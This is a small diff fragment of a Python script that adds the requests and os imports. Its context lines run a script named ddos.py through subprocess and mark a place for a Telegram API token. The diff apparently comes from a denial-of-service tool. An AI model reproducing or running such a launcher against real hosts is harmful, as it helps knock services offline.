@@ -3,6 +3,8 @@ import subprocess
 import socket
 import sys
 import subprocess
+import requests
+import os
 
 subprocess.call(['python', 'ddos.py'])
 # Telegram API token
